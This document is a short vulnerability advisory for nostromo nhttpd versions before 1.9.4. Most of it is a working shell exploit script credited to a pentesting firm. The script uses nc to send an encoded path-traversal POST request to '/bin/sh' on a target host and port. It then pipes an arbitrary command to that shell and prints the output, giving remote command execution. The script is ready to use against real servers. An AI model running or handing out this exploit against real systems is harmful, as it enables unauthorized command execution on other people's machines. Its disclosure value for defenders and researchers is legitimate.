source: https://www.securityfocus.com/bid/46880/info

nostromo nhttpd is prone to a remote command-execution vulnerability because it fails to properly validate user-supplied data.

An attacker can exploit this issue to access arbitrary files and execute arbitrary commands with application-level privileges.

nostromo versions prior to 1.9.4 are affected.

#!/bin/sh
######################################
#                                    #
#  RedTeam Pentesting GmbH           #
#  kontakt@redteam-pentesting.de     #
#  http://www.redteam-pentesting.de  #
#                                    #
######################################

if [ $# -lt 3 ]; then
    echo "Usage: $(basename $0) HOST PORT COMMAND..."
    exit 2
fi


HOST="$1"
PORT="$2"
shift 2

( \
    echo -n -e 'POST /..%2f..%2f..%2fbin/sh HTTP/1.0\r\n'; \
    echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \
    echo "$@ 2>&1" \
) | nc "$HOST" "$PORT" \
  | sed --quiet --expression ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'